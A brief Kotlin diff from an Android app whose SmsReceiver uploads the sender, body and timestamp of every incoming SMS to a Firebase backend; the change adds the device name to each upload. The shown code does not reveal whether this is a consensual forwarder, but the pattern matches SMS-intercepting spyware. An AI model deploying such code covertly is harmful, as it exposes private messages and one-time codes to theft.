@@ -9,12 +9,13 @@ class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
 
+        val device = DevicePrefs.getDeviceName(context)
         val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
         for (sms in messages) {
             val sender = sms.originatingAddress ?: "Номаълум"
             val body = sms.messageBody ?: ""
             val timestamp = sms.timestampMillis
-            FirebaseHelper.pushSms(sender, body, timestamp)
+            FirebaseHelper.pushSms(sender, body, timestamp, device)
         }
     }
 }
